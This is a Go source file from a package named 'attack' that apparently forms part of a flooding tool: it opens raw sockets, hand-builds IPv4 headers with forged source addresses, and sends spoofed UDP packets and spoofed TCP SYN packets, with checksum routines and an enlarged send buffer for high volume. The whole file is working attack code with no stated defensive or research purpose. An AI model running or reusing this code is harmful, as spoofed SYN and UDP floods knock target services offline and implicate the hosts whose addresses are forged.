//go:build linux || darwin

package attack

import (
	"encoding/binary"
	"net"
	"sync"
	"syscall"
	"time"
)

func SupportsSpoofing() bool {
	return true
}

type SpoofConn struct {
	fd     int
	addr   syscall.SockaddrInet4
	buf    []byte // reusable send buffer, grows once
	bufCap int
}

var spoofBufPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 1500)
		return &b
	},
}

func NewSpoofConn(dstIP string, dstPort int) (*SpoofConn, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return nil, err
	}

	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		syscall.Close(fd)
		return nil, err
	}

	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 16*1024*1024); err != nil {
	}

	ip := net.ParseIP(dstIP)
	if ip == nil {
		syscall.Close(fd)
		return nil, &net.ParseError{Type: "IP address", Text: dstIP}
	}
	ip4 := ip.To4()
	if ip4 == nil {
		syscall.Close(fd)
		return nil, &net.ParseError{Type: "IPv4 address", Text: dstIP}
	}

	addr := syscall.SockaddrInet4{}
	copy(addr.Addr[:], ip4)

	return &SpoofConn{fd: fd, addr: addr}, nil
}

func (c *SpoofConn) growBuf(need int) {
	if cap(c.buf) >= need {
		c.buf = c.buf[:need]
		return
	}
	c.buf = make([]byte, need)
}

func (c *SpoofConn) Send(srcIP string, dstIP string, dstPort int, payload []byte) error {
	src := net.ParseIP(srcIP).To4()
	dst := net.ParseIP(dstIP).To4()
	if src == nil || dst == nil {
		return &net.ParseError{Type: "IP address", Text: srcIP + " or " + dstIP}
	}

	udpLen := 8 + len(payload)
	totalLen := 20 + udpLen
	c.growBuf(totalLen)
	pkt := c.buf

	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:4], uint16(totalLen))
	pkt[8] = 64
	pkt[9] = 17
	copy(pkt[12:16], src)
	copy(pkt[16:20], dst)

	ipCsum := ipChecksumFast(pkt[:20])
	binary.BigEndian.PutUint16(pkt[10:12], ipCsum)

	udpHdr := pkt[20:28]
	binary.BigEndian.PutUint16(udpHdr[2:4], uint16(dstPort))
	binary.BigEndian.PutUint16(udpHdr[4:6], uint16(udpLen))

	copy(pkt[28:], payload)

	udpCsum := udpChecksumFast(src, dst, udpHdr, payload)
	binary.BigEndian.PutUint16(udpHdr[6:8], udpCsum)

	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dst)
	return syscall.Sendto(c.fd, pkt, 0, &addr)
}

func (c *SpoofConn) SendSYN(srcIP, dstIP string, dstPort, srcPort int) error {
	src := net.ParseIP(srcIP).To4()
	dst := net.ParseIP(dstIP).To4()
	if src == nil || dst == nil {
		return &net.ParseError{Type: "IP address", Text: srcIP + " or " + dstIP}
	}

	const totalLen = 40
	c.growBuf(totalLen)
	pkt := c.buf

	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:4], uint16(totalLen))
	pkt[8] = 64
	pkt[9] = 6
	copy(pkt[12:16], src)
	copy(pkt[16:20], dst)

	ipCsum := ipChecksumFast(pkt[:20])
	binary.BigEndian.PutUint16(pkt[10:12], ipCsum)

	tcpHdr := pkt[20:]
	binary.BigEndian.PutUint16(tcpHdr[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(tcpHdr[2:4], uint16(dstPort))
	binary.BigEndian.PutUint32(tcpHdr[4:8], uint32(srcPort^dstPort^int(time.Now().UnixNano())))
	binary.BigEndian.PutUint32(tcpHdr[8:12], 0)
	tcpHdr[12] = 0x50
	tcpHdr[13] = 0x02
	binary.BigEndian.PutUint16(tcpHdr[14:16], 65535)

	tcpCsum := tcpChecksumFast(src, dst, tcpHdr, nil)
	binary.BigEndian.PutUint16(tcpHdr[16:18], tcpCsum)

	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dst)
	return syscall.Sendto(c.fd, pkt, 0, &addr)
}

func (c *SpoofConn) SendSYNRaw(src [4]byte, dstIP string, dstPort, srcPort int) error {
	dst := net.ParseIP(dstIP).To4()
	if dst == nil {
		return &net.ParseError{Type: "IP address", Text: dstIP}
	}

	const totalLen = 40
	c.growBuf(totalLen)
	pkt := c.buf

	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:4], uint16(totalLen))
	pkt[8] = 64
	pkt[9] = 6
	copy(pkt[12:16], src[:])
	copy(pkt[16:20], dst)

	ipCsum := ipChecksumFast(pkt[:20])
	binary.BigEndian.PutUint16(pkt[10:12], ipCsum)

	tcpHdr := pkt[20:]
	binary.BigEndian.PutUint16(tcpHdr[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(tcpHdr[2:4], uint16(dstPort))
	binary.BigEndian.PutUint32(tcpHdr[4:8], uint32(srcPort^dstPort^int(time.Now().UnixNano())))
	binary.BigEndian.PutUint32(tcpHdr[8:12], 0)
	tcpHdr[12] = 0x50
	tcpHdr[13] = 0x02
	binary.BigEndian.PutUint16(tcpHdr[14:16], 65535)

	tcpCsum := tcpChecksumFast(src[:], dst, tcpHdr, nil)
	binary.BigEndian.PutUint16(tcpHdr[16:18], tcpCsum)

	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dst)
	return syscall.Sendto(c.fd, pkt, 0, &addr)
}

func (c *SpoofConn) Close() error {
	return syscall.Close(c.fd)
}

func SendSpoofedSYNRaw(src [4]byte, dstIP string, dstPort, srcPort int) error {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)

	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		return err
	}

	dst := net.ParseIP(dstIP).To4()
	if dst == nil {
		return &net.ParseError{Type: "IP address", Text: dstIP}
	}

	totalLen := 40
	buf := *spoofBufPool.Get().(*[]byte)
	defer spoofBufPool.Put(&buf)
	pkt := buf[:totalLen]

	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:4], uint16(totalLen))
	pkt[8] = 64
	pkt[9] = 6
	copy(pkt[12:16], src[:])
	copy(pkt[16:20], dst)

	ipCsum := ipChecksumFast(pkt[:20])
	binary.BigEndian.PutUint16(pkt[10:12], ipCsum)

	tcpHdr := pkt[20:]
	binary.BigEndian.PutUint16(tcpHdr[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(tcpHdr[2:4], uint16(dstPort))
	binary.BigEndian.PutUint32(tcpHdr[4:8], uint32(srcPort^dstPort^int(time.Now().UnixNano())))
	binary.BigEndian.PutUint32(tcpHdr[8:12], 0)
	tcpHdr[12] = 0x50
	tcpHdr[13] = 0x02
	binary.BigEndian.PutUint16(tcpHdr[14:16], 65535)

	tcpCsum := tcpChecksumFast(src[:], dst, tcpHdr, nil)
	binary.BigEndian.PutUint16(tcpHdr[16:18], tcpCsum)

	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dst)
	return syscall.Sendto(fd, pkt, 0, &addr)
}

func SendSpoofedSYN(srcIP string, dstIP string, dstPort int, srcPort int) error {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)

	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		return err
	}

	src := net.ParseIP(srcIP).To4()
	dst := net.ParseIP(dstIP).To4()
	if src == nil || dst == nil {
		return &net.ParseError{Type: "IP address", Text: srcIP + " or " + dstIP}
	}

	totalLen := 40
	buf := *spoofBufPool.Get().(*[]byte)
	defer spoofBufPool.Put(&buf)
	pkt := buf[:totalLen]

	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:4], uint16(totalLen))
	pkt[8] = 64
	pkt[9] = 6
	copy(pkt[12:16], src)
	copy(pkt[16:20], dst)

	ipCsum := ipChecksumFast(pkt[:20])
	binary.BigEndian.PutUint16(pkt[10:12], ipCsum)

	tcpHdr := pkt[20:]
	binary.BigEndian.PutUint16(tcpHdr[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(tcpHdr[2:4], uint16(dstPort))
	binary.BigEndian.PutUint32(tcpHdr[4:8], uint32(srcPort^dstPort^int(time.Now().UnixNano())))
	binary.BigEndian.PutUint32(tcpHdr[8:12], 0)
	tcpHdr[12] = 0x50
	tcpHdr[13] = 0x02
	binary.BigEndian.PutUint16(tcpHdr[14:16], 65535)

	tcpCsum := tcpChecksumFast(src, dst, tcpHdr, nil)
	binary.BigEndian.PutUint16(tcpHdr[16:18], tcpCsum)

	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dst)
	return syscall.Sendto(fd, pkt, 0, &addr)
}

func tcpChecksumFast(src, dst net.IP, tcpHdr, payload []byte) uint16 {
	sum := uint32(0)
	sum += uint32(uint16(src[0])<<8 | uint16(src[1]))
	sum += uint32(uint16(src[2])<<8 | uint16(src[3]))
	sum += uint32(uint16(dst[0])<<8 | uint16(dst[1]))
	sum += uint32(uint16(dst[2])<<8 | uint16(dst[3]))
	sum += 6
	sum += uint32(uint16(len(tcpHdr) + len(payload)))
	sum = checksumWords(sum, tcpHdr)
	sum = checksumWords(sum, payload)
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func udpChecksumFast(src, dst net.IP, udpHdr, payload []byte) uint16 {
	sum := uint32(0)
	sum += uint32(uint16(src[0])<<8 | uint16(src[1]))
	sum += uint32(uint16(src[2])<<8 | uint16(src[3]))
	sum += uint32(uint16(dst[0])<<8 | uint16(dst[1]))
	sum += uint32(uint16(dst[2])<<8 | uint16(dst[3]))
	sum += 17
	sum += uint32(uint16(len(udpHdr) + len(payload)))
	sum = checksumWords(sum, udpHdr)
	sum = checksumWords(sum, payload)
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func ipChecksumFast(header []byte) uint16 {
	sum := checksumWords(0, header)
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func checksumWords(seed uint32, data []byte) uint32 {
	sum := seed
	n := len(data)
	for i := 0; i < n-1; i += 2 {
		sum += uint32(uint16(data[i])<<8 | uint16(data[i+1]))
	}
	if n&1 == 1 {
		sum += uint32(data[n-1]) << 8
	}
	return sum
}

var checksumFunc = checksumWords

func tcpChecksumInternal(src, dst net.IP, tcpHdr, payload []byte) uint16 {
	sum := uint32(0)
	sum += uint32(uint16(src[0])<<8 | uint16(src[1]))
	sum += uint32(uint16(src[2])<<8 | uint16(src[3]))
	sum += uint32(uint16(dst[0])<<8 | uint16(dst[1]))
	sum += uint32(uint16(dst[2])<<8 | uint16(dst[3]))
	sum += 6
	sum += uint32(uint16(len(tcpHdr) + len(payload)))
	sum = checksumFunc(sum, tcpHdr)
	sum = checksumFunc(sum, payload)
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func checksumInternal(data []byte) uint16 {
	sum := checksumFunc(0, data)
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func udpChecksumInternal(src, dst net.IP, udpHdr, payload []byte) uint16 {
	sum := uint32(0)
	sum += uint32(uint16(src[0])<<8 | uint16(src[1]))
	sum += uint32(uint16(src[2])<<8 | uint16(src[3]))
	sum += uint32(uint16(dst[0])<<8 | uint16(dst[1]))
	sum += uint32(uint16(dst[2])<<8 | uint16(dst[3]))
	sum += 17
	sum += uint32(uint16(len(udpHdr) + len(payload)))
	sum = checksumFunc(sum, udpHdr)
	sum = checksumFunc(sum, payload)
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}
